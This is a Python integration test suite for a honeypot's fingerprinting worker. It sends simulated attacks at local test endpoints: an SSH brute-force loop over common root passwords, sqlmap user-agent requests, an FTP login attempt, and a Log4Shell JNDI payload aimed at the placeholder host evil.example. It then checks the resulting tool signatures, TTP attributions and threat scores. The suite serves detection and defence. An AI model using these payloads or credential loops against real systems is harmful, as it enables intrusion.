"""Live FingerprintWorker integration test.

These tests drive a real probe at the honeypot, then poll the `fingerprints`
table for the row the worker writes. They assert the enriched payload — tool
signatures, timing pattern, sibling-session detection — matches what we
expect for known attacker shapes.

The worker is consumed by the running container, so the round-trip exercises
the full event-bus → aggregator → enrichment → upsert path.

Requires SSH_ALLOW_AFTER_N_ATTEMPTS=3 (the dev default) which limits a single
TCP transport to ~4 captured auth events. We therefore test the wordlist rule
(>=3 attempts + >=2 hits) directly and assert burst rule fires whenever the
4th cred is granted-then-rejected by paramiko.
"""

from __future__ import annotations

import contextlib
import socket
import time
from datetime import UTC, datetime

import httpx
import paramiko
import pytest
from sqlalchemy import select

from honeystrike.core.models import Fingerprint, Session, TTPMatch

# Hydra default-wordlist root passwords; first 4 cover the dev grant threshold.
_HYDRA_ROOT_PWS = ("root", "toor", "123456", "password", "hunter2", "letmein")


def _ssh_brute_force(host: str, port: int) -> datetime:
    """Submit up to 6 root:* creds in one TCP session.

    Stops on AUTH_SUCCESSFUL (so paramiko doesn't raise on a closed transport).
    Returns the wall-clock 'before' so the test can locate the new session row.
    """
    before = datetime.now(UTC)
    sock = socket.create_connection((host, port), timeout=10)
    t = paramiko.Transport(sock)
    t.start_client(timeout=10)
    for pw in _HYDRA_ROOT_PWS:
        try:
            t.auth_password("root", pw)
            break
        except paramiko.AuthenticationException:
            continue
        except paramiko.SSHException:
            break
    t.close()
    return before


async def _reset_ssh_counter(redis_client) -> None:
    """Wipe ssh:attempts:* so the brute-force probe starts at zero. Without this
    a prior test in the same session leaves enough state to short-circuit the
    grant decision and we capture too few auth attempts to fire the wordlist
    rule.
    """
    keys = await redis_client.keys("ssh:attempts:*")
    if keys:
        await redis_client.delete(*keys)


@pytest.mark.asyncio
async def test_worker_fingerprints_ssh_brute_force_session(
    ssh_endpoint, db, redis_client, wait_for
) -> None:
    host, port = ssh_endpoint
    await _reset_ssh_counter(redis_client)
    before = _ssh_brute_force(host, port)

    async def _fingerprint_for_latest_ssh() -> Fingerprint | None:
        sess_row = (
            (
                await db.execute(
                    select(Session)
                    .where(Session.service == "ssh")
                    .where(Session.started_at >= before)
                    .order_by(Session.started_at.desc())
                    .limit(1)
                )
            )
            .scalars()
            .first()
        )
        if sess_row is None:
            return None
        fp = (
            (
                await db.execute(
                    select(Fingerprint).where(Fingerprint.session_id == sess_row.id)
                )
            )
            .scalars()
            .first()
        )
        return fp

    fp = await wait_for(_fingerprint_for_latest_ssh, timeout=45.0)
    assert fp is not None, "worker did not write a fingerprint within 45s"

    # The wordlist rule fires on >=3 Hydra creds with >=2 hits — guaranteed by
    # the first three creds (root:root, root:toor, root:123456 all in _HYDRA_FAST_CREDS).
    tool_names = {sig["name"] for sig in fp.tool_signatures}
    assert "Hydra" in tool_names, fp.tool_signatures

    # Geo + abuse may be None (no MaxMind / no API key on dev). The structural
    # invariants must hold regardless.
    assert fp.raw_enrichment.get("service") == "ssh"
    assert fp.timing_pattern in {"burst", "slow", "random", "unknown"}


@pytest.mark.asyncio
async def test_worker_detects_multi_service_scan_via_sibling_sessions(
    ssh_endpoint, http_endpoint, ftp_endpoint, db, wait_for
) -> None:
    """One client hits SSH+HTTP+FTP within 60s — the worker's sibling-session
    query should surface the other two services and the multi-service-scan
    rule should fire on at least one of the resulting fingerprints.
    """
    ssh_host, ssh_port = ssh_endpoint
    ftp_host, ftp_port = ftp_endpoint
    before = datetime.now(UTC)

    # SSH probe — single failed auth, quick.
    sock = socket.create_connection((ssh_host, ssh_port), timeout=10)
    t = paramiko.Transport(sock)
    t.start_client(timeout=10)
    with contextlib.suppress(paramiko.AuthenticationException):
        t.auth_password("scanner", "scanner")
    t.close()

    # HTTP probe with sqlmap UA — guarantees a tool match on the http fingerprint.
    async with httpx.AsyncClient(timeout=10) as client:
        await client.get(
            f"{http_endpoint}/wp-login.php",
            headers={"User-Agent": "sqlmap/1.7.8#stable"},
        )

    # FTP probe — drop a couple of commands.
    import ftplib
    f = ftplib.FTP()
    f.connect(ftp_host, ftp_port, timeout=10)
    with contextlib.suppress(Exception):
        f.login("root", "toor")
    with contextlib.suppress(Exception):
        f.quit()

    # Wait for the worker to fingerprint all three new sessions.
    async def _fps_for_three_services() -> list[Fingerprint] | None:
        rows = (
            (
                await db.execute(
                    select(Fingerprint)
                    .join(Session, Session.id == Fingerprint.session_id)
                    .where(Session.started_at >= before)
                )
            )
            .scalars()
            .all()
        )
        services = {row.raw_enrichment.get("service") for row in rows}
        if {"ssh", "http", "ftp"}.issubset(services):
            return list(rows)
        return None

    # Give the idle-drain time to flush short-lived sessions.
    time.sleep(2)
    fps = await wait_for(_fps_for_three_services, timeout=60.0)
    assert fps is not None, (
        "worker did not fingerprint all three services within 60s — "
        "check idle-drain interval and that sibling_sessions wiring is live"
    )

    # At least one fingerprint must carry a multi-service-scan signature; the
    # rule name is "Masscan / port-scan" for >=3 services, "Multi-service scanner"
    # for ==2. The first-flushed session may see only one sibling so accept either.
    all_signature_names: set[str] = set()
    for fp in fps:
        for sig in fp.tool_signatures:
            all_signature_names.add(sig["name"])
    assert all_signature_names & {"Masscan / port-scan", "Multi-service scanner"}, (
        f"no multi-service signature surfaced — saw {all_signature_names}"
    )


@pytest.mark.asyncio
async def test_worker_persists_ttp_matches_and_session_threat_score(
    http_endpoint, db, wait_for
) -> None:
    """A single HTTP request carrying a CVE signature must produce:
      - a fingerprint row,
      - a `ttp_matches` row attributing T1190 to the session,
      - a non-zero `sessions.threat_score` with `severity` reflecting the score.
    """
    before = datetime.now(UTC)

    async with httpx.AsyncClient(timeout=10) as client:
        # sqlmap UA hits the scanner detector; the Log4Shell-flavoured body
        # triggers cve_signature=CVE-2021-44228 → T1190.
        await client.post(
            f"{http_endpoint}/api/v1/health",
            content="${jndi:ldap://evil.example/a}",
            headers={
                "Content-Type": "text/plain",
                "User-Agent": "sqlmap/1.7.8#stable",
            },
        )

    async def _scored_session_and_ttp() -> tuple[Session, list[TTPMatch]] | None:
        sess = (
            (
                await db.execute(
                    select(Session)
                    .where(Session.service == "http")
                    .where(Session.started_at >= before)
                    .order_by(Session.started_at.desc())
                    .limit(1)
                )
            )
            .scalars()
            .first()
        )
        if sess is None or sess.state != "CLOSED":
            return None
        await db.refresh(sess)
        if sess.threat_score <= 0:
            return None
        ttps = (
            (
                await db.execute(
                    select(TTPMatch).where(TTPMatch.session_id == sess.id)
                )
            )
            .scalars()
            .all()
        )
        return sess, list(ttps)

    result = await wait_for(_scored_session_and_ttp, timeout=45.0)
    assert result is not None, "worker did not score the HTTP session within 45s"
    sess, ttps = result

    technique_ids = {t.technique_id for t in ttps}
    assert "T1190" in technique_ids, (
        f"expected T1190 attribution, got {technique_ids}"
    )

    assert sess.severity in {"low", "medium", "high", "critical"}
    # T1190 alone gives ttp_component=round(50*0.85)=42; sqlmap (0.99 ≥ 0.70)
    # adds tool_component=15. Total ≥ 57 → severity high.
    assert sess.severity in {"high", "critical"}, (
        f"expected high+ severity for sqlmap + T1190, got "
        f"{sess.severity} (score={sess.threat_score})"
    )
